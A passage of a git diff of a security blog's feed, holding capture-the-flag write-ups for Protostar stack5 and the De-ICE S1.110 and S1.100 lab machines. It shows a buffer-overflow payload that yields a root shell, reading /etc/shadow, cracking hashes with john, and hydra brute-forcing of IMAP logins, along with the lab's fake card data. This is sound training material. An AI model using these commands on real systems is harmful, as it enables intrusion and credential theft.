+bash: ./stack5: No such file or directory
+user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff70].pack(&ldquo;V&rdquo;)&rsquo; | /opt/protostar/bin/stack5
+Segmentation fault
+user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff70].pack(&ldquo;V&rdquo;)&rsquo; | ./r.sh /opt/protostar/bin/stack5
+user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff70].pack(&ldquo;V&rdquo;)&rsquo; | ./r.sh /opt/protostar/bin/stack5
+user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff70].pack(&ldquo;V&rdquo;)&rsquo; ; cat -) | ./r.sh /opt/protostar/bin/stack5
+id
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Exploit-Exercises: Nebula (16-19)]]></title>
@@ -6285,7 +7419,7 @@ predictable for dirb.</p>
 
 <p>There is nothing interesting for us except the sysadmin account.</p>
 
-<p>Web page mentions <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#99;&#117;&#x73;&#116;&#x6f;&#x6d;&#101;&#114;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;&#97;&#100;&#109;&#105;&#110;&#x40;&#x6e;&#x6f;&#x73;&#x65;&#99;&#x62;&#97;&#x6e;&#x6b;&#x2e;&#x63;&#x6f;&#109;">&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#101;&#x72;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x6e;&#x6f;&#115;&#x65;&#99;&#x62;&#97;&#x6e;&#x6b;&#x2e;&#99;&#111;&#109;</a> email address. After a
+<p>Web page mentions <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#99;&#117;&#x73;&#x74;&#111;&#109;&#x65;&#x72;&#x73;&#101;&#x72;&#118;&#105;&#99;&#x65;&#97;&#100;&#109;&#105;&#x6e;&#64;&#110;&#111;&#115;&#x65;&#x63;&#98;&#97;&#110;&#x6b;&#x2e;&#x63;&#x6f;&#109;">&#99;&#117;&#115;&#x74;&#x6f;&#109;&#101;&#114;&#115;&#101;&#x72;&#x76;&#105;&#x63;&#101;&#97;&#100;&#109;&#105;&#110;&#64;&#110;&#111;&#x73;&#101;&#99;&#98;&#x61;&#x6e;&#x6b;&#46;&#x63;&#x6f;&#109;</a> email address. After a
 little trying, we found out the user account that exists:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -11096,675 +12230,6 @@ pirrip user:</p>
 </span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
 </span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
 </span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DE-ICE-S1.110]]></title>
-    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110/"/>
-    <updated>2015-05-10T00:01:04+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
-</span><span class='line'>22/tcp  filtered ssh 
-</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
-</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>FTP anonymous login is allowed:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r ftp://ftp@192.168.1.110:</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We have found a few files, but nothing particularly interesting:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
-</span><span class='line'>SYSTEM:*:18:544:,S-1-5-18::
-</span><span class='line'>Administrators:*:544:544:,S-1-5-32-544::
-</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
-</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
-</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
-</span><span class='line'>__vmware_user__:unused_by_nt/2000/xp:1002:513:__vmware_user__,U-Tom-PC\__vmware_user__,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/__vmware_user__:/bin/bash
-</span><span class='line'>
-</span><span class='line'>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
-</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>
-</span><span class='line'>toor             (root)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>
-
-<p>In /etc directory, there is a core file which contains password hashes:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
-</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After adjusting:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
-</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
-</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john --wordlist="/root/darkc0de.lst"
-</span><span class='line'>Complexity       (root)
-</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We log in as user bbanter and obtain root permissions:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
-</span><span class='line'>Password: **********
-</span><span class='line'>root@slax:/# id
-</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Lastly, we check the backup file and decrypt CSV:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh
-</span><span class='line'><span class="c">#!/bin/sh</span>
-</span><span class='line'><span class="c">#encrypt files in ftp/incoming</span>
-</span><span class='line'>openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw
-</span><span class='line'><span class="c">#remove old file</span>
-</span><span class='line'>rm /home/ftp/incoming/<span class="nv">$1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
-</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
-</span><span class='line'>"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
-</span><span class='line'>1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
-</span><span class='line'>1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
-</span><span class='line'>1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
-</span><span class='line'>1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
-</span><span class='line'>1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
-</span><span class='line'>1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DE-ICE-S1.100]]></title>
-    <link href="http://73696e65.github.io/blog/2015/05/09/de-ice-s1-dot-100/"/>
-    <updated>2015-05-09T20:55:07+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/05/09/de-ice-s1-dot-100</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1100,8/">De-ICE: S1.100</a></p>
-
-<p>The output from nmap:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
-</span><span class='line'>20/tcp  closed ftp-data
-</span><span class='line'>21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
-</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
-</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
-</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
-</span><span class='line'>110/tcp open   pop3     Openwall popa3d
-</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
-</span><span class='line'>443/tcp closed https
-</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We connect to the web site and save the staff names to the file:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat names.txt 
-</span><span class='line'>Marie Mary
-</span><span class='line'>Pat Patrick
-</span><span class='line'>Terry Thompson
-</span><span class='line'>Ben Benedict
-</span><span class='line'>Erin Gennieg
-</span><span class='line'>Paul Michael
-</span><span class='line'>Ester Long
-</span><span class='line'>Adam Adams
-</span><span class='line'>Bob Banter
-</span><span class='line'>Chad Coffee</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using this script <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/865a89c2db01c2a5589c534b7f56d1669dddf0ab/namemash.py">namemash.py</a>
-we generate the potential login names:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat userlist.txt
-</span><span class='line'>mariemary
-</span><span class='line'>marymarie
-</span><span class='line'>marie.mary
-</span><span class='line'>mary.marie
-</span><span class='line'>marym
-</span><span class='line'>mmary
-</span><span class='line'>mmarie
-</span><span class='line'>m.mary
-</span><span class='line'>m.marie
-</span><span class='line'>marie
-</span><span class='line'>mary
-</span><span class='line'>patpatrick
-</span><span class='line'>patrickpat
-</span><span class='line'>pat.patrick
-</span><span class='line'>patrick.pat
-</span><span class='line'>patrickp
-</span><span class='line'>ppatrick
-</span><span class='line'>ppat
-</span><span class='line'>p.patrick
-</span><span class='line'>p.pat
-</span><span class='line'>pat
-</span><span class='line'>patrick
-</span><span class='line'>terrythompson
-</span><span class='line'>thompsonterry
-</span><span class='line'>terry.thompson
-</span><span class='line'>thompson.terry
-</span><span class='line'>thompsont
-</span><span class='line'>tthompson
-</span><span class='line'>tterry
-</span><span class='line'>t.thompson
-</span><span class='line'>t.terry
-</span><span class='line'>terry
-</span><span class='line'>thompson
-</span><span class='line'>benbenedict
-</span><span class='line'>benedictben
-</span><span class='line'>ben.benedict
-</span><span class='line'>benedict.ben
-</span><span class='line'>benedictb
-</span><span class='line'>bbenedict
-</span><span class='line'>bben
-</span><span class='line'>b.benedict
-</span><span class='line'>b.ben
-</span><span class='line'>ben
-</span><span class='line'>benedict
-</span><span class='line'>eringennieg
-</span><span class='line'>genniegerin
-</span><span class='line'>erin.gennieg
-</span><span class='line'>gennieg.erin
-</span><span class='line'>genniege
-</span><span class='line'>egennieg
-</span><span class='line'>gerin
-</span><span class='line'>e.gennieg
-</span><span class='line'>g.erin
-</span><span class='line'>erin
-</span><span class='line'>gennieg
-</span><span class='line'>paulmichael
-</span><span class='line'>michaelpaul
-</span><span class='line'>paul.michael
-</span><span class='line'>michael.paul
-</span><span class='line'>michaelp
-</span><span class='line'>pmichael
-</span><span class='line'>mpaul
-</span><span class='line'>p.michael
-</span><span class='line'>m.paul
-</span><span class='line'>paul
-</span><span class='line'>michael
-</span><span class='line'>esterlong
-</span><span class='line'>longester
-</span><span class='line'>ester.long
-</span><span class='line'>long.ester
-</span><span class='line'>longe
-</span><span class='line'>elong
-</span><span class='line'>lester
-</span><span class='line'>e.long
-</span><span class='line'>l.ester
-</span><span class='line'>ester
-</span><span class='line'>long
-</span><span class='line'>adamadams
-</span><span class='line'>adamsadam
-</span><span class='line'>adam.adams
-</span><span class='line'>adams.adam
-</span><span class='line'>adamsa
-</span><span class='line'>aadams
-</span><span class='line'>aadam
-</span><span class='line'>a.adams
-</span><span class='line'>a.adam
-</span><span class='line'>adam
-</span><span class='line'>adams
-</span><span class='line'>bobbanter
-</span><span class='line'>banterbob
-</span><span class='line'>bob.banter
-</span><span class='line'>banter.bob
-</span><span class='line'>banterb
-</span><span class='line'>bbanter
-</span><span class='line'>bbob
-</span><span class='line'>b.banter
-</span><span class='line'>b.bob
-</span><span class='line'>bob
-</span><span class='line'>banter
-</span><span class='line'>chadcoffee
-</span><span class='line'>coffeechad
-</span><span class='line'>chad.coffee
-</span><span class='line'>coffee.chad
-</span><span class='line'>coffeec
-</span><span class='line'>ccoffee
-</span><span class='line'>cchad
-</span><span class='line'>c.coffee
-</span><span class='line'>c.chad
-</span><span class='line'>chad
-</span><span class='line'>coffee</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In this case, the better way should be to use SMTP enumeration:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: a@slax.example.net
-</span><span class='line'>250 2.1.0 a@slax.example.net... Sender ok
-</span><span class='line'>rcpt to: bbanter@slax.example.net
-</span><span class='line'>250 2.1.5 bbanter@slax.example.net... Recipient ok
-</span><span class='line'>rcpt to: bbanter
-</span><span class='line'>250 2.1.5 bbanter@slax.example.net... Recipient ok
-</span><span class='line'>rcpt to: aadam
-</span><span class='line'>550 5.1.1 aadam... User unknown
-</span><span class='line'>rcpt to: aadams
-</span><span class='line'>250 2.1.5 aadams... Recipient ok</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We use hydra to perform brute-force attack via imap service:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ hydra -L userlist.txt 192.168.1.100 imap -u -e nsr
-</span><span class='line'>[143][imap] host: 192.168.1.100   login: bbanter   password: bbanter</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After login as bbanter, we download the /etc/passwd file to create more accurate wordlist:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat userlist2.txt
-</span><span class='line'>aadams
-</span><span class='line'>ccoffee</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ hydra -L userlist2.txt 192.168.1.100 imap -u -P /usr/share/wordlists/rockyou.txt
-</span><span class='line'>[143][imap] host: 192.168.1.100   login: aadams   password: nostradamus</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We found no working exploit using <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester</a>.</p>
-
-<p>User aadams is in the wheel group:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/passwd:
-</span><span class='line'>aadams:x:1000:10:,,,:/home/aadams:/bin/bash
-</span><span class='line'>/etc/group:
-</span><span class='line'>wheel::10:root</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Checking sudo -l reveals how to get root hash:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
-</span><span class='line'>User aadams may run the following commands on this host:
-</span><span class='line'>    (root) NOEXEC: /bin/ls
-</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
-</span><span class='line'>    (root) NOEXEC: /usr/bin/more
-</span><span class='line'>    (root) NOEXEC: !/usr/bin/su *root*
-</span><span class='line'>
-</span><span class='line'>aadams@slax:/tmp$ sudo cat /etc/shadow
-</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
-</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using John, we cracked these hashes:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>tarot            (root)
-</span><span class='line'>hierophant       (ccoffee)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We find salary_dec2003.csv.enc in FTP directory and because there is suspicous
-line in /etc/passwd (DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION), we
-know that the password for this file could be the same as for root.</p>
-
-<p>For this purpose, we wroted the following script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
